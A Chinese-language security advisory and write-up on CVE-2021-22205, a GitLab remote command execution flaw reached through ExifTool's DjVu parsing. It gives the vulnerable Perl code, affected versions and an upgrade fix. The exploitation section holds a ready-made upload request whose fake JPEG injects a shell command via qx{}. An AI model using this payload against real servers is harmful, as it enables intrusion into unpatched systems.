### 一 漏洞描述
GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。  
gitlab调用了exiftool（一个图像处理软件)，而exitftool未正确验证传递给文件解析器的图像文件，存在命令执行漏洞（CVE-2021-22205）  

图片拥有标签，如相机的品牌和型号，光圈或ISO等。  
ExifTool可编辑或删除标签这些元数据。而ExifTool在解析DjVu注释的ParseAnt函数中存在漏洞。  
当访问gitlab接口/uploads/user上传图像文件时，GitLab会将扩展名为jpg、jpeg、tiff文件传递给ExifTool，用于删除其中不合法的标签。  
而ExifTool在解析文件的时候会忽略文件的扩展名，尝试根据文件的内容来确定文件类型，其中支持的类型有DjVu。  
所以可上传jpg后缀、内容为DjVu格式的文件，触发漏洞。  

ExifTool解析图片为什么有命令执行? ExitTool包含eval的代码段(perl)，eval是为了支持C语言的转义序列
```
$tok = '';
for (;;) {
  # get string up to the next quotation mark
  # this doesn't work in perl 5.6.2! grrrr
  # last Tok unless $$dataPt =~ /(.*?)"/sg;
  # $tok .= $1;
  my $pos = pos($$dataPt);
  last Tok unless $$dataPt =~ /"/sg;
  $tok .= substr($$dataPt, $pos, pos($$dataPt)-1-$pos);
  # we're good unless quote was escaped by odd number of backslashes
  last unless $tok =~ /(\\+)$/ and length($1) & 0x01;
  $tok .= '"';    # quote is part of the string
}
# must protect unescaped "$" and "@" symbols, and "\" at end of string
$tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
# convert C escape sequences (allowed in quoted text)
$tok = eval qq{"$tok"};
```

影响范围  
11.9 <= Gitlab CE/EE < 13.8.8  
12.13.9 <= Gitlab CE/EE < 13.9.6  
13.13.10 <= Gitlab CE/EE < 13.10.3  

### 二 漏洞利用
```
token = '从 /users/sign_in 获取'

headers = {
"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
"X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate",
"Cookie": f"{cookiea[1]}; {cookiea[0]}",
}

uri = "/uploads/user"
data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{" + command + "} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
    
```

### 三 漏洞修复
升级

> 参考链接
> exiftool介绍: https://news.sinabz.com/hulianwang/202002/6109.html  
> 分析: https://www.anquanke.com/post/id/261233#h3-6  
> 天融信阿尔法: http://blog.topsec.com.cn/cve-2021-22204-gitlab-rce%E4%B9%8Bexiftool%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/
> 发现者原文译文: https://xz.aliyun.com/t/9762
